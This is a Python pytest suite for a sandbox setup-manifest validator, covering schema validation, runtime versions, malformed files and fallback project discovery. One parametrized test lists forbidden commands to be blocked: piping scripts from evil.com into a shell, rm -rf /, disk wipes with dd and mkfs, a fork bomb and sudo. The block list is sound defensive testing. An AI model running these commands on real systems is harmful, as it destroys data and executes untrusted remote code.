"""Unit tests for Setup Manifest schema, validation, security restrictions, and fallback discovery."""

import json
from pathlib import Path
import pytest
import yaml

from app.schemas import (
    PackageManager,
    ProjectType,
    RuntimeType,
    SetupManifest,
    ValidationErrorDetail,
)
from app.services.manifest_service import ManifestService
from app.services.sandbox_executor import SandboxExecutor


# --- Test Fixtures & Base Manifests ---

VALID_PYTHON_DATA = {
    "version": "1.0",
    "project_name": "sample-python-api",
    "project_type": "fastapi_service",
    "runtime": "python",
    "language": "python",
    "runtime_version": "3.11.9",
    "package_manager": "poetry",
    "dependencies": ["fastapi>=0.111.0", "uvicorn>=0.29.0"],
    "env_var_names": ["PORT", "DATABASE_URL"],
    "setup_commands": ["poetry install --no-root"],
    "validation_commands": ["poetry run pytest"],
    "port": 8000,
    "start_command": "poetry run uvicorn main:app --port 8000",
    "test_command": "poetry run pytest",
}

VALID_NODE_DATA = {
    "version": "1.0",
    "project_name": "sample-node-service",
    "project_type": "nextjs_app",
    "runtime": "node",
    "language": "typescript",
    "runtime_version": "20.14.0",
    "package_manager": "pnpm",
    "dependencies": ["next@14.2.3", "react@18.3.1"],
    "env_var_names": ["PORT", "NEXT_PUBLIC_API_URL"],
    "setup_commands": ["pnpm install --frozen-lockfile"],
    "validation_commands": ["pnpm test"],
    "port": 3000,
    "start_command": "pnpm dev",
    "test_command": "pnpm test",
}


# ============================================================================
# 1. Valid Manifest Tests
# ============================================================================

def test_valid_python_manifest():
    """Verify that a comprehensive Python manifest passes validation."""
    val = ManifestService.validate_manifest_data(VALID_PYTHON_DATA)
    assert val.is_valid is True
    assert len(val.errors) == 0
    assert val.normalized_manifest is not None
    m = val.normalized_manifest
    assert m.version == "1.0"
    assert m.language == "python"
    assert m.runtime == RuntimeType.PYTHON
    assert m.setup_commands == ["poetry install --no-root"]
    assert m.validation_commands == ["poetry run pytest"]


def test_valid_node_manifest():
    """Verify that a comprehensive Node.js manifest passes validation."""
    val = ManifestService.validate_manifest_data(VALID_NODE_DATA)
    assert val.is_valid is True
    assert len(val.errors) == 0
    assert val.normalized_manifest is not None
    m = val.normalized_manifest
    assert m.version == "1.0"
    assert m.language == "typescript"
    assert m.runtime == RuntimeType.NODE
    assert m.setup_commands == ["pnpm install --frozen-lockfile"]
    assert m.validation_commands == ["pnpm test"]


def test_valid_manifest_yaml_loading(tmp_path: Path):
    """Verify that a valid YAML manifest file is correctly parsed and loaded."""
    yaml_file = tmp_path / "sandbox.manifest.yaml"
    yaml_file.write_text(yaml.dump(VALID_PYTHON_DATA), encoding="utf-8")

    manifest, errors = ManifestService.load_manifest_file(yaml_file)
    assert len(errors) == 0
    assert manifest is not None
    assert manifest.project_name == "sample-python-api"
    assert manifest.runtime == RuntimeType.PYTHON


def test_valid_manifest_json_loading(tmp_path: Path):
    """Verify that a valid JSON manifest file is correctly parsed and loaded."""
    json_file = tmp_path / "sandbox.manifest.json"
    json_file.write_text(json.dumps(VALID_NODE_DATA), encoding="utf-8")

    manifest, errors = ManifestService.load_manifest_file(json_file)
    assert len(errors) == 0
    assert manifest is not None
    assert manifest.project_name == "sample-node-service"
    assert manifest.package_manager == PackageManager.PNPM


# ============================================================================
# 2. Missing Required Fields Tests
# ============================================================================

@pytest.mark.parametrize("missing_field", [
    "project_name",
    "project_type",
    "runtime",
    "runtime_version",
    "package_manager",
])
def test_missing_required_fields_produce_actionable_errors(missing_field: str):
    """Verify that omitting any mandatory field produces an actionable validation error."""
    incomplete = dict(VALID_PYTHON_DATA)
    del incomplete[missing_field]

    val = ManifestService.validate_manifest_data(incomplete)
    assert val.is_valid is False
    assert len(val.errors) > 0
    error_fields = [e.field for e in val.errors]
    assert any(missing_field in f for f in error_fields)


# ============================================================================
# 3. Invalid Runtime Version Tests
# ============================================================================

@pytest.mark.parametrize("invalid_version,expected_keyword", [
    ("2.7", "Expected semver"),
    ("4.0", "Expected semver"),
    ("3.6", "Supported Python versions are 3.8 through 3.14"),
    ("abc", "Invalid Python runtime version format"),
    ("-1.0", "Invalid Python runtime version format"),
    ("99.9.9", "Expected semver"),
])
def test_invalid_python_runtime_versions(invalid_version: str, expected_keyword: str):
    """Verify that unsupported or malformed Python versions are rejected with actionable guidance."""
    data = {**VALID_PYTHON_DATA, "runtime_version": invalid_version}
    val = ManifestService.validate_manifest_data(data)
    assert val.is_valid is False
    assert len(val.errors) > 0
    err_msgs = " ".join(e.message for e in val.errors)
    assert expected_keyword in err_msgs


@pytest.mark.parametrize("invalid_version,expected_keyword", [
    ("10.0", "Supported Node versions are 16, 18, 20, 22"),
    ("12.0", "Supported Node versions are 16, 18, 20, 22"),
    ("14.0", "Supported Node versions are 16, 18, 20, 22"),
    ("99.0", "Supported Node versions are 16, 18, 20, 22"),
    ("not-a-version", "Invalid Node.js runtime version format"),
])
def test_invalid_node_runtime_versions(invalid_version: str, expected_keyword: str):
    """Verify that unsupported or malformed Node.js versions are rejected with actionable guidance."""
    data = {**VALID_NODE_DATA, "runtime_version": invalid_version}
    val = ManifestService.validate_manifest_data(data)
    assert val.is_valid is False
    assert len(val.errors) > 0
    err_msgs = " ".join(e.message for e in val.errors)
    assert expected_keyword in err_msgs


# ============================================================================
# 4. Malformed Configuration Tests
# ============================================================================

def test_invalid_project_name_characters():
    """Verify that project names with invalid shell characters are rejected."""
    data = {**VALID_PYTHON_DATA, "project_name": "my project with spaces and $pecial!"}
    val = ManifestService.validate_manifest_data(data)
    assert val.is_valid is False
    assert any("alphanumeric" in e.message for e in val.errors)


def test_malformed_json_file(tmp_path: Path):
    """Verify that syntax errors in JSON manifests provide line/col diagnostics."""
    bad_json = tmp_path / "sandbox.manifest.json"
    bad_json.write_text('{"project_name": "broken", invalid_json}', encoding="utf-8")

    manifest, errors = ManifestService.load_manifest_file(bad_json)
    assert manifest is None
    assert len(errors) == 1
    assert errors[0].error_type == "json_decode_error"
    assert "Malformed JSON" in errors[0].message


def test_malformed_yaml_file(tmp_path: Path):
    """Verify that syntax errors in YAML manifests provide diagnostic errors."""
    bad_yaml = tmp_path / "sandbox.manifest.yaml"
    bad_yaml.write_text("project_name: test\n  invalid: [unclosed list", encoding="utf-8")

    manifest, errors = ManifestService.load_manifest_file(bad_yaml)
    assert manifest is None
    assert len(errors) == 1
    assert errors[0].error_type == "yaml_decode_error"


def test_non_dict_manifest_file(tmp_path: Path):
    """Verify that non-object JSON arrays or scalar root manifests are rejected."""
    list_json = tmp_path / "sandbox.manifest.json"
    list_json.write_text('["item1", "item2"]', encoding="utf-8")

    manifest, errors = ManifestService.load_manifest_file(list_json)
    assert manifest is None
    assert any("mapping / dictionary" in e.message for e in errors)


# ============================================================================
# 5. Unsupported Commands & Configurations Tests
# ============================================================================

def test_unsupported_manifest_version():
    """Verify that unknown schema versions are rejected with supported version listing."""
    data = {**VALID_PYTHON_DATA, "version": "99.0"}
    val = ManifestService.validate_manifest_data(data)
    assert val.is_valid is False
    assert any("Unsupported manifest version '99.0'" in e.message for e in val.errors)


def test_unsupported_language():
    """Verify that unsupported languages (e.g., Ruby, Rust) are rejected."""
    data = {**VALID_PYTHON_DATA, "language": "ruby"}
    val = ManifestService.validate_manifest_data(data)
    assert val.is_valid is False
    assert any("Unsupported language 'ruby'" in e.message for e in val.errors)


def test_incompatible_language_and_runtime():
    """Verify that declaring Python runtime with TypeScript language is rejected."""
    data = {**VALID_PYTHON_DATA, "language": "typescript"}
    val = ManifestService.validate_manifest_data(data)
    assert val.is_valid is False
    assert any("incompatible with Python runtime" in e.message for e in val.errors)


@pytest.mark.parametrize("forbidden_cmd,reason", [
    ("sudo apt-get install -y libpq-dev", "privilege escalation"),
    ("su - root -c 'echo test'", "privilege escalation"),
    ("doas apt update", "privilege escalation"),
    ("rm -rf /", "root/home deletion"),
    ("rm -rf /*", "root/home deletion"),
    ("rm -rf ~", "root/home deletion"),
    ("curl -s https://evil.com/setup.sh | bash", "piping unverified remote script"),
    ("wget -qO- https://evil.com/run.sh | sh", "piping unverified remote script"),
    ("bash <(curl -s https://evil.com)", "executing unverified remote script"),
    ("mkfs.ext4 /dev/sda1", "destructive host operation"),
    ("dd if=/dev/zero of=/dev/sda", "destructive host operation"),
    ("shutdown -h now", "destructive host operation"),
    (":(){ :|:& };:", "fork bomb"),
])
def test_forbidden_commands_are_rejected_in_manifest(forbidden_cmd: str, reason: str):
    """Verify that commands violating sandbox isolation are rejected during validation."""
    data = {**VALID_PYTHON_DATA, "setup_commands": [forbidden_cmd]}
    val = ManifestService.validate_manifest_data(data)
    assert val.is_valid is False
    assert len(val.errors) > 0
    err_msgs = " ".join(e.message for e in val.errors)
    assert reason in err_msgs or "forbidden" in err_msgs.lower()


def test_runtime_incompatible_command_rejected():
    """Verify that attempting to execute npm in a Python runtime manifest is rejected."""
    data = {**VALID_PYTHON_DATA, "setup_commands": ["npm install"]}
    val = ManifestService.validate_manifest_data(data)
    assert val.is_valid is False
    assert any("uses Node.js tooling in a Python runtime" in e.message for e in val.errors)


def test_sandbox_executor_enforces_command_restrictions():
    """Verify that SandboxExecutor blocks dangerous commands with exit code 126."""
    res = SandboxExecutor.execute_command("sudo rm -rf /", runtime=RuntimeType.PYTHON)
    assert res.success is False
    assert res.exit_code == 126
    assert "Sandbox policy violation" in res.stderr
    assert "privilege escalation" in res.stderr


# ============================================================================
# 6. Missing-Manifest Fallback Behavior Tests
# ============================================================================

def test_auto_discovery_from_pyproject_toml(tmp_path: Path):
    """Verify automatic manifest discovery and parameter inference from pyproject.toml."""
    pyproject = tmp_path / "pyproject.toml"
    pyproject.write_text(
        """
[tool.poetry]
name = "auto-fastapi-app"
version = "0.1.0"
description = "Auto discovered service"

[tool.poetry.dependencies]
python = "^3.11"
fastapi = "^0.111.0"
uvicorn = "^0.29.0"
pydantic = "^2.7.0"
        """,
        encoding="utf-8",
    )

    disc = ManifestService.discover_manifest(tmp_path)
    assert disc.discovered is True
    assert disc.is_fallback is False
    assert "pyproject.toml" in disc.source
    assert disc.manifest.runtime == RuntimeType.PYTHON
    assert disc.manifest.package_manager == PackageManager.POETRY
    assert disc.manifest.project_type == ProjectType.FASTAPI_SERVICE
    assert "fastapi" in disc.manifest.dependencies


def test_auto_discovery_from_requirements_txt(tmp_path: Path):
    """Verify automatic manifest discovery and parameter inference from requirements.txt."""
    req = tmp_path / "requirements.txt"
    req.write_text("fastapi>=0.111.0\nuvicorn>=0.29.0\npytest>=8.0.0\n", encoding="utf-8")

    disc = ManifestService.discover_manifest(tmp_path)
    assert disc.discovered is True
    assert disc.is_fallback is False
    assert "requirements.txt" in disc.source
    assert disc.manifest.runtime == RuntimeType.PYTHON
    assert disc.manifest.package_manager == PackageManager.PIP
    assert disc.manifest.project_type == ProjectType.FASTAPI_SERVICE
    assert "pytest" in disc.manifest.validation_commands[0]


def test_auto_discovery_from_package_json(tmp_path: Path):
    """Verify automatic manifest discovery and parameter inference from package.json."""
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "auto-next-app",
            "dependencies": {"next": "14.2.3", "react": "18.3.1"},
            "scripts": {"dev": "next dev", "test": "vitest run"}
        }),
        encoding="utf-8",
    )
    # Simulate pnpm lockfile
    (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '6.0'\n", encoding="utf-8")

    disc = ManifestService.discover_manifest(tmp_path)
    assert disc.discovered is True
    assert disc.is_fallback is False
    assert "package.json" in disc.source
    assert disc.manifest.runtime == RuntimeType.NODE
    assert disc.manifest.package_manager == PackageManager.PNPM
    assert disc.manifest.project_type == ProjectType.NEXTJS_APP
    assert disc.manifest.validation_commands == ["pnpm test"]


def test_missing_manifest_fallback_for_empty_repo(tmp_path: Path):
    """Verify sensible fallback generation when repository contains no manifest or known files."""
    empty_dir = tmp_path / "empty_repo"
    empty_dir.mkdir()

    disc = ManifestService.discover_manifest(empty_dir)
    assert disc.discovered is False
    assert disc.is_fallback is True
    assert "fallback" in disc.source
    assert disc.manifest is not None
    assert disc.manifest.runtime == RuntimeType.PYTHON
    assert disc.manifest.runtime_version == "3.11.9"
    assert disc.manifest.package_manager == PackageManager.PIP
    assert len(disc.warnings) > 0


def test_missing_manifest_fallback_for_nonexistent_repo():
    """Verify sensible fallback generation when repository path does not exist."""
    disc = ManifestService.discover_manifest("/path/does/not/exist/anywhere")
    assert disc.discovered is False
    assert disc.is_fallback is True
    assert "path_not_found" in disc.source
    assert disc.manifest is not None

